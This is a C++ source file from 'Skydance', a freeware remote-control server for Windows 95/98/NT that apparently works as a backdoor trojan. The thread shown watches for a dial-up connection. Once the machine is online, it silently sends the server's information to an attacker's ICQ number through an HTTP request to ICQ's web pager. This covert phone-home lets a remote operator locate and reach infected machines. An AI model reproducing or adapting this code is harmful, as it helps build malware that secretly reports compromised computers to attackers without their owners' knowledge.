/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// OnlineThread.cpp: Implementierungsdatei
//

#include "stdafx.h"
#include "SkyServer.h"
#include "OnlineThread.h"
//#include "SkySocket.h"
#include <ras.h>	//connetced?
#pragma comment(lib,"rasapi32.lib") //von :)

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CSkySocket *cIcqSocket;


BOOL IsConnected()
{
	LPRASCONN lpRasConn;
	lpRasConn = (LPRASCONN) GlobalAlloc(GPTR, sizeof(RASCONN));
	lpRasConn->dwSize = sizeof(RASCONN);
	
	unsigned long lpcb = 256;
	unsigned long lpcConnections;
	BOOL nRet; 
	nRet = RasEnumConnections(lpRasConn, &lpcb, &lpcConnections);
	if (nRet != 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
		/*for (int i = 0; i < lpcConnections; i++)
		{
			printf("Entry name: %s\n", lpRasConn->szEntryName);
			lpRasConn++;
		}*/
	}
}

/////////////////////////////////////////////////////////////////////////////
// COnlineThread

IMPLEMENT_DYNCREATE(COnlineThread, CWinThread)

COnlineThread::COnlineThread()
{
	m_biConnected = FALSE;
}

COnlineThread::~COnlineThread()
{
}

void COnlineThread::SocketThreadInit()
{
	#ifndef _AFXDLL
	#define _AFX_SOCK_THREAD_STATE AFX_MODULE_THREAD_STATE
	#define _afxSockThreadState AfxGetModuleThreadState()
		_AFX_SOCK_THREAD_STATE* pState = _afxSockThreadState;
		if (pState->m_pmapSocketHandle == NULL)
			pState->m_pmapSocketHandle = new CMapPtrToPtr;
		if (pState->m_pmapDeadSockets == NULL)
			pState->m_pmapDeadSockets = new CMapPtrToPtr;
		if (pState->m_plistSocketNotifications == NULL)
			pState->m_plistSocketNotifications = new CPtrList;

	#endif
}

BOOL COnlineThread::InitInstance()
{
	SocketThreadInit();
	//AfxMessageBox("Thread ini");
	DetectOnlineFunc();
	return TRUE;
}

int COnlineThread::ExitInstance()
{
	// ZU ERLEDIGEN:  Bereinigungen für jeden Thread hier durchführen
	return CWinThread::ExitInstance();
}

BEGIN_MESSAGE_MAP(COnlineThread, CWinThread)
	//{{AFX_MSG_MAP(COnlineThread)
		// HINWEIS - Der Klassen-Assistent fügt hier Zuordnungsmakros ein und entfernt diese.
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Behandlungsroutinen für Nachrichten COnlineThread 

void COnlineThread::DetectOnlineFunc()
{
	BOOL biConnected;
	//DWORD dwFlags = 1;//INTERNET_CONNECTION_MODEM ;
	while (TRUE)
	{
//		biConnected = InternetGetConnectedState(&dwFlags, 0);
		biConnected = IsConnected();
		if (m_biConnected != biConnected)
		{
			if (biConnected)
			{
				
				//Sleep(30000);		
				SendICQPager(m_sUIN);
				//AfxMessageBox(m_sUIN);
				//OnConnect();
			}		
			else
			{
				//OnDisconnect();
				//AfxMessageBox("bli");
			}
			m_biConnected = biConnected;
		}
		// yield remaining timeslice
		Sleep(1500);
	}
}

void COnlineThread::SendICQPager(CString UIN)
{
	Sleep(25000);		
	cIcqSocket = new CSkySocket(5);
	cIcqSocket->Create();
	//AfxMessageBox("Blub");
	CString sWWWstring("");
	if(cIcqSocket->Connect("wwp.icq.com", 80) == 0)
	{	
		//AfxMessageBox("Not Conneted");
	}
	else 
	{
		sWWWstring = "GET /scripts/WWPMsg.dll\?from=SKD&fromemail=no@mail.com&subject=Skydance2.291&body=" + m_sServerInfo + "&to=" + UIN + "&Send=Message HTTP/1.1\015\012Accept: */*\015\012Accept-Language: de\015\012Accept-Encoding: gzip, deflate\015\012User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; ABJ578Tg)\015\012Host: localhost\015\012Connection: Keep-Alive\015\012\015\012\n";
		int iLength = sWWWstring.GetLength();
		cIcqSocket->Send(sWWWstring, iLength);
		Sleep(2500);
		//AfxMessageBox("Send");
		//AfxMessageBox(sWWWstring);
	}
	cIcqSocket->Close();
	delete cIcqSocket;
}
